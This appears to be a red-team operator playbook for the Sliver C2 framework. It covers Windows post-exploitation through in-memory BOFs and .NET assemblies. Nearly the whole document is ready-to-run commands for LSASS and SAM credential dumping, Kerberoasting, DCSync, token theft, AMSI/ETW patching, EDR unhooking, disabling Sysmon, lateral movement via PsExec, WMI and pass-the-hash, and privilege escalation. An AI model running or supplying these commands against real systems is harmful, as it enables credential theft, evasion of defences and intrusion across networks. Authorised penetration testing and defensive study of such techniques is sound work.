# Sliver BOF Arsenal — In-Memory Post-Exploitation

## Overview

Beacon Object Files (BOFs) and .NET assemblies executed through Sliver sessions.
BOFs run inside the implant process with no file drop, no new process, and
minimal forensic artifacts. This is the preferred method for all Windows
post-exploitation when stealth matters.

## BOF Execution Methods

### inline-execute (C/C++ BOFs)

```bash
# Load and run a compiled BOF (.o file)
sliver [session] > inline-execute /path/to/bof.x64.o [args...]

# The BOF runs inside the Sliver implant process
# Output is returned through the C2 channel
# No file is written to disk
```

### execute-assembly (.NET Assemblies)

```bash
# Load and run a .NET assembly in-memory
sliver [session] > execute-assembly /path/to/tool.exe [-- args...]

# The assembly is loaded reflectively — no file drop
# Uses Sliver's built-in .NET loader (CLR hosting)
# Arguments after -- are passed to the assembly
```

### sideload (Native DLLs)

```bash
# Load a DLL into a sacrificial process
sliver [session] > sideload /path/to/library.dll [entrypoint] [args...]

# Creates a new process to host the DLL
# Specify export function name as entrypoint
```

## Credential Harvesting BOFs

### LSASS Dumping (Multiple Techniques)

```bash
# Nanodump — most reliable, uses syscalls
sliver [session] > inline-execute /opt/tools/bofs/nanodump.x64.o \
  --write C:\\Windows\\Temp\\debug.dmp
sliver [session] > download C:\\Windows\\Temp\\debug.dmp /tmp/lsass.dmp
# Parse with pypykatz on Kali:
pypykatz lsa minidump /tmp/lsass.dmp

# MiniDumpWriteDump BOF
sliver [session] > inline-execute /opt/tools/bofs/minidump.x64.o lsass.exe

# PPLdump — bypass PPL protection
sliver [session] > inline-execute /opt/tools/bofs/ppldump.x64.o

# HandleKatz — dump via duplicated handles (avoids direct LSASS open)
sliver [session] > inline-execute /opt/tools/bofs/handlekatz.x64.o
```

### SAM / LSA / DPAPI

```bash
# SAM dump (built-in Sliver command)
sliver [session] > hashdump

# LSA Secrets
sliver [session] > inline-execute /opt/tools/bofs/lsa_secrets.x64.o

# Cached domain credentials
sliver [session] > inline-execute /opt/tools/bofs/cached_creds.x64.o

# DPAPI master keys + Chrome/Edge credentials
sliver [session] > execute-assembly /opt/tools/SharpDPAPI.exe -- triage
sliver [session] > execute-assembly /opt/tools/SharpChromium.exe -- logins
```

### Kerberos Attacks

```bash
# Kerberoasting — extract TGS tickets for offline cracking
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- kerberoast /outfile:kerberoast.txt
# Crack on Kali:
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting — extract AS-REP for accounts without preauth
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- asreproast /outfile:asrep.txt
# Crack on Kali:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Ticket extraction and pass-the-ticket
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- triage
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- dump /luid:0x12345
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- ptt /ticket:base64_ticket

# Request TGT with harvested credentials
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- asktgt \
  /user:admin /password:Password123 /domain:corp.local /ptt

# DCSync (requires Domain Admin or replication rights)
sliver [session] > execute-assembly /opt/tools/SharpKatz.exe -- --Command dcsync --User corp\\krbtgt --Domain corp.local
```

### Token / Credential Theft

```bash
# Steal token from a process
sliver [session] > steal-token <PID>

# Impersonate logged-on user
sliver [session] > impersonate <USERNAME>

# Make token (with known creds)
sliver [session] > make-token -u administrator -p Password123 -d corp.local

# Revert to original token
sliver [session] > rev2self

# List access tokens
sliver [session] > inline-execute /opt/tools/bofs/token_list.x64.o
```

## AD Enumeration BOFs

```bash
# SharpHound — BloodHound data collection
sliver [session] > execute-assembly /opt/tools/SharpHound.exe -- -c All
sliver [session] > download C:\\Windows\\Temp\\*_BloodHound.zip /tmp/loot/

# ADSearch — targeted LDAP queries
sliver [session] > execute-assembly /opt/tools/ADSearch.exe -- \
  --search "(&(objectClass=user)(adminCount=1))" --attributes cn,memberOf

# Domain enumeration
sliver [session] > execute-assembly /opt/tools/ADSearch.exe -- \
  --search "(objectClass=domain)" --attributes name,objectSid

# Find domain admins
sliver [session] > execute-assembly /opt/tools/ADSearch.exe -- \
  --search "(&(objectClass=group)(cn=Domain Admins))" --attributes member

# Enumerate trusts
sliver [session] > execute-assembly /opt/tools/ADSearch.exe -- \
  --search "(objectClass=trustedDomain)" --attributes name,trustDirection

# Find SPNs (for Kerberoasting targets)
sliver [session] > execute-assembly /opt/tools/ADSearch.exe -- \
  --search "(&(objectClass=user)(servicePrincipalName=*))" \
  --attributes cn,servicePrincipalName

# Enumerate GPOs
sliver [session] > execute-assembly /opt/tools/SharpGPOAbuse.exe -- --ListGPOs

# StandIn — AD persistence and ACL abuse
sliver [session] > execute-assembly /opt/tools/StandIn.exe -- --object "DC=corp,DC=local" --acl
```

## Evasion BOFs

```bash
# AMSI bypass (must run BEFORE execute-assembly of .NET tools)
sliver [session] > inline-execute /opt/tools/bofs/amsi_patch.x64.o

# ETW bypass (blinds EDR telemetry)
sliver [session] > inline-execute /opt/tools/bofs/etw_patch.x64.o

# Unhook ntdll.dll (remove EDR inline hooks)
sliver [session] > inline-execute /opt/tools/bofs/unhook_ntdll.x64.o

# Block DLL loading (prevent EDR DLL injection)
sliver [session] > inline-execute /opt/tools/bofs/block_dll.x64.o

# Disable Sysmon
sliver [session] > inline-execute /opt/tools/bofs/disable_sysmon.x64.o
```

## Lateral Movement BOFs

```bash
# SCShell — fileless lateral via service manager
sliver [session] > inline-execute /opt/tools/bofs/scshell.x64.o \
  TARGET_IP service_name "cmd.exe /c COMMAND"

# WMI exec — execute command on remote host
sliver [session] > inline-execute /opt/tools/bofs/wmi_exec.x64.o \
  TARGET_IP "cmd /c whoami"

# PsExec — remote service execution
sliver [session] > inline-execute /opt/tools/bofs/psexec.x64.o \
  TARGET_IP cmd.exe

# Pass-the-hash via SMB
sliver [session] > inline-execute /opt/tools/bofs/pth_smb.x64.o \
  TARGET_IP administrator NTLM_HASH

# WinRM execution
sliver [session] > inline-execute /opt/tools/bofs/winrm_exec.x64.o \
  TARGET_IP administrator Password123 "whoami"
```

## Privilege Escalation BOFs

```bash
# Named pipe impersonation (built-in Sliver)
sliver [session] > getsystem

# Potato attacks
sliver [session] > upload /opt/tools/GodPotato.exe C:\\Windows\\Temp\\gp.exe
sliver [session] > execute -o "C:\\Windows\\Temp\\gp.exe -cmd 'C:\\Windows\\Temp\\implant.exe'"

# PrintSpoofer (SeImpersonatePrivilege → SYSTEM)
sliver [session] > upload /opt/tools/PrintSpoofer.exe C:\\Windows\\Temp\\ps.exe
sliver [session] > execute -o "C:\\Windows\\Temp\\ps.exe -c C:\\Windows\\Temp\\implant.exe"

# Token manipulation
sliver [session] > steal-token <SYSTEM_PROCESS_PID>

# UAC bypass
sliver [session] > execute-assembly /opt/tools/SharpBypassUAC.exe
```

## BOF Development Notes

### BOF File Naming Convention

```
<tool_name>.<arch>.o
Examples:
  nanodump.x64.o
  amsi_patch.x64.o
  scshell.x64.o
  etw_patch.x86.o
```

### BOF Sources

| BOF | Repository | Purpose |
|-----|-----------|---------|
| nanodump | helpsystems/nanodump | LSASS dump via syscalls |
| SA (Situational Awareness) | trustedsec/CS-Situational-Awareness-BOF | Host enum |
| BOF.NET | CCob/BOF.NET | Run .NET from BOF |
| InlineWhispers | outflanknl/InlineWhispers | Direct syscall BOFs |
| Unhook BOF | rsmudge/unhook-bof | Remove EDR hooks |

## Evidence Collection

- BOF execution output (captured through C2 channel)
- Credential material with source attribution
- AD enumeration data (BloodHound zip)
- Kerberos ticket hashes
- Token manipulation results
- Lateral movement proof (whoami on new hosts)
